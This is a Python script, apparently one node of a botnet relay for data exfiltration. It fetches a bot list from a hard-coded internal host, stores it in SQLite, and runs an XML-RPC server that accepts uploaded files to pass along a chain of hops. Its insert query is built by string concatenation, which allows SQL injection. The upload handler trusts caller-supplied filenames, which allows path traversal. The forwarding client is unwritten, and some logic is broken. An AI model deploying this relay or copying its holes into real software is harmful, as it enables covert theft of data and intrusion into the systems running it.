import xml.etree.ElementTree as etree
import sqlite3 as sql
import os, re, socket, subprocess, sys, time
import urllib.request
import multiprocessing as mp
from time import strftime
from xmlrpc.server import SimpleXMLRPCServer
from xmlrpc.server import SimpleXMLRPCRequestHandler

### Set global configuration parms ###
# How long to wait for XML server to respond?
socket.setdefaulttimeout(3)
# Where is men.xml data stored locally?
db = 'men.db'
# Where are incoming/outgoing files stored?
data_dir = 'data'


class RequestHandler(SimpleXMLRPCRequestHandler):
    '''A (very) simple XMLRPC server that merely accepts
    file uploads from client instances.
    '''
    def __init__(self, ip, port):
        self.server = SimpleXMLRPCServer((ip, port))
        self.server.register_introspection_functions()
        self.server.register_function(self.server_receive_file, 'server_receive_file')
        if not os.path.exists(data_dir):
            try:
                os.makedirs(data_dir)
            except OSError as e:
                print('ERROR: XMLRPC server unable to create data directory:', e)
                sys.exit(1)
        try:
            self.server.serve_forever()
        except KeyboardInterrupt:
            print('Bye from the XMLRPC server!')
            sys.exit(0)
            
    def server_receive_file(self, filename, contents):
        with open(data_dir + '/' + filename, "wb") as handle:
            handle.write(contents.data)
            return True                                                                                                                                            

def get_my_IP():
    p=subprocess.Popen('ifconfig',stdout=subprocess.PIPE,stderr=None,shell=True)
    output = str(p.communicate())
    p1 = re.compile('inet addr:.*Bcast')
    line = p1.findall(output)
    ipaddress = line[0].split(':')[1].split()[0]
    return ipaddress

def get_my_config(conn, myIP):
    c = conn.cursor()
    c.execute('select port, seq_no from men where ip=?', (myIP,))
    my_config = c.fetchone()
    c.close()
    return my_config

def get_next_hops(conn, seq_no):
    c = conn.cursor()
    c.execute('select max(seq_no) from men')
    last = c.fetchone()
    c.execute("select ip, port from men where active = 'True' and seq_no > ?  and seq_no <= ? order by seq_no", (str(seq_no), last[0], ))
    next = c.fetchall()
    c.close()
    return next

def create_men_db(conn):
    ### Create a local SQLite3 database and table
    # to hold the data on exfiltration bots
    # conn = sql.connect('men.db')
    c = conn.cursor()
    c.execute('drop table if exists men')
    c.execute('create table men(ip text, port text, seq_no integer, active bool)')
    conn.commit()
    c.close()

def parseXML(url, file='men.xml'):
    ### Go and get the XML file with the bot data
    try:
        # Grab the file and store it locally
        urllib.request.urlretrieve(url, file)
        # Parse it for processing
        tree = etree.parse(file).getroot()
        return tree
    except:
        return None

def store_bot_info(tree, conn):
    ### Store the data from the XML file in a local database
    c = conn.cursor()
    # Loop through the XML tree and insert the data for each
    # bot in a local database
    for child in tree:
        data = []
        query = "insert into men values("
        for node in child.getchildren():
            data.append(node.text)
        for item in data[:-1]:
            query += "'" + item + "',"
        query += "'" + data[-1] + "')"
        c.execute(query)
        conn.commit()
    c.close()
    
if __name__=='__main__':
    # Get my ip address
    my_ip = get_my_IP()
    #myIP = '10.0.1.243'
    print('My IP is:', my_ip, end = '; ')
    # We'll use just one db connection
    # and pass it around, as needed
    conn = sql.connect(db)
    # Get the tree from the men.xml file
    url = 'http://10.0.1.221:82/men.xml'
    tree = parseXML(url)
    if len(tree):
        # Create/open and populate the men database
        create_men_db(conn)
        store_bot_info(tree, conn)
    else:
        print('Can\'t reach the server. Using an old copy, if it exists!')
    # What's my assigned server port number and seq_no?
    my_config = get_my_config(conn, my_ip)
    if my_config == None:
        print('No botnet info available from XML server for my node! Exiting...')
        sys.exit(1)
    my_port, my_seq_no = my_config
    # At this point, we have all the info 
    # needed to fire up an XMLRPC server
    print('My port number is', my_port, 'and my sequence number is', my_seq_no)
    # We'll only start a server if my_seq_no != 0
    # In that case, we only need to start up an XMLRPC client
    if my_seq_no > 0:
        try:
            print(strftime('%H:%M:%S') + ' Spawning child process for XMLRPC server' + '...', end = '')
            server = mp.Process(target=RequestHandler, args=(my_ip, int(my_port),))
            server.start()
            time.sleep(1)
            if server.is_alive():
                print('success!')
            else:
                print('Whoops! The server doesn\'t seem to have started. Exiting...')
                sys.exit(1)
                
        except Exception as e:
            print('ERROR: Can\'t start XMLRPC server instance:', e)

    # Now, who is our next hop? We need this
    # to define which server to connect our
    # client to, if any...
    print('My sequence number is', my_seq_no)
    next_hops = get_next_hops(conn, my_seq_no)
    print('The next hops are', next_hops)

    # If the return value is None, that means
    # we're the last hop, in which case we
    # won't be defining a client

    if next_hops != None:
        print('Fire up a client!')
    else:
        print('We\'re done here!')

    while True:
        try:
            time.sleep(30)
            if not server.is_alive():
                print('ERROR: My server seems to have left the building. Exiting...')
        except KeyboardInterrupt:
            print('Main program says bye!')
            break
